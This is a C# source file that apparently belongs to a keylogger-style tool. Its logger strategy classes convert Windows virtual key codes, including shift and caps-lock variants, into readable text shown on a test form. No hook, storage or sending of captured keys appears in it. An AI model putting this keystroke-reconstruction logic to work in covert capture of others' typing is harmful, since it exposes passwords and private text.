using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Reflection.Emit;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Windows.Input;
using static VirtualKeyCodes;

namespace IP
{
    public class LoggerWriter
    {
        private static ILoggerWriter _writer = new VKCodeStrategy();

        public void SetStrategy(ILoggerWriter strategy)
        {
            _writer = strategy;
        }
        public void HandleVK(int vkCode, String path, TestUI form)
        {
            _writer.WriteToLog(vkCode, path, form);
        }
    }

    public class VKCodeStrategy : ILoggerWriter
    {
        public void WriteToLog(int vkCode, string path, TestUI form)
        {
            Console.WriteLine(vkCode);
            form.KeyText.AppendText("0x"+vkCode.ToString("X"));

        }
    }

    public class ToStringStrategy : ILoggerWriter
    {
        public void WriteToLog(int vkCode, string path, TestUI form)
        {
            Console.WriteLine((Keys)vkCode);
            form.KeyText.AppendText((Keys)vkCode + "");
        }
    }

    public class ToCharStrategy : ILoggerWriter
    {
        public void WriteToLog(int vkCode, string path, TestUI form)
        {
            Console.WriteLine((char)vkCode);
            form.KeyText.AppendText((char)vkCode + "");
        }
    }

    public class SmartStrategy : ILoggerWriter
    {

        bool shift = false;
        public void WriteToLog(int vkCode, string path, TestUI form)
        {
            bool isCapital = Control.IsKeyLocked(Keys.CapsLock);
            switch (vkCode)
            {
                case VK_BACK:
                    {
                        if (form.KeyText.Text.Length > 0)
                        {
                            form.KeyText.Text = form.KeyText.Text.Remove(form.KeyText.Text.Length - 1);
                        }
                        break;
                    }
                case VK_RETURN:
                    {

                        form.KeyText.AppendText("\r\n");
                        break;
                    }
                case VK_CAPITAL:
                    {
                        isCapital = !isCapital;
                        break;
                    }
                case VK_LSHIFT: { break; }
                case VK_RSHIFT: { break; }
                case VK_0:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText(")");
                        else
                            form.KeyText.AppendText("0");
                        break;
                    }
                case VK_1:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("!");
                        else
                            form.KeyText.AppendText("1");
                        break;
                    }
                case VK_2:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("@");
                        else
                            form.KeyText.AppendText("2");
                        break;
                    }
                case VK_3:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("#");
                        else
                            form.KeyText.AppendText("3");
                        break;
                    }
                case VK_4:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("$");
                        else
                            form.KeyText.AppendText("4");
                        break;
                    }
                case VK_5:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("%");
                        else
                            form.KeyText.AppendText("5");
                        break;
                    }
                case VK_6:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("^");
                        else
                            form.KeyText.AppendText("6");
                        break;
                    }
                case VK_7:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("&");
                        else
                            form.KeyText.AppendText("7");
                        break;
                    }
                case VK_8:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("*");
                        else
                            form.KeyText.AppendText("8");
                        break;
                    }
                case VK_9:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("(");
                        else
                            form.KeyText.AppendText("9");
                        break;
                    }
                case VK_OEM_1:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText(":");
                        else
                            form.KeyText.AppendText(";");
                        break; 
                    }
                case VK_OEM_2:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("?");
                        else
                            form.KeyText.AppendText("/");
                        break;
                    }
                case VK_OEM_3:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("~");
                        else
                            form.KeyText.AppendText("`");
                        break;
                    }
                case VK_OEM_4:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("{");
                        else
                            form.KeyText.AppendText("[");
                        break;
                    }
                case VK_OEM_5:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText(@"\");
                        else
                            form.KeyText.AppendText("|");
                        break;
                    }
                case VK_OEM_6:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("}");
                        else
                            form.KeyText.AppendText("]");
                        break;
                    }
                case VK_OEM_7:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText(@"""");
                        else
                            form.KeyText.AppendText("'");
                        break;
                    }
                case VK_OEM_PERIOD:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText(">");

                        else
                            form.KeyText.AppendText(".");
                        break;
                    }
                case VK_OEM_COMMA:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("<");
                        else
                            form.KeyText.AppendText(",");
                        break;
                    }
                case VK_OEM_PLUS:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("+");
                        else
                            form.KeyText.AppendText("=");
                        break;
                    }
                case VK_OEM_MINUS:
                    {
                        if ((Control.ModifierKeys & Keys.Shift) != 0)
                            form.KeyText.AppendText("_");
                        else
                            form.KeyText.AppendText("-");
                        break;
                    }
                default:
                    {
                        if (!isCapital && vkCode >= VK_A && vkCode <= VK_Z)
                            form.KeyText.AppendText((char)(vkCode + 32) + "");
                        else
                            form.KeyText.AppendText((char)vkCode + "");
                        Console.WriteLine((Keys)vkCode);
                        break;
                    }

            }
        }

    }
}

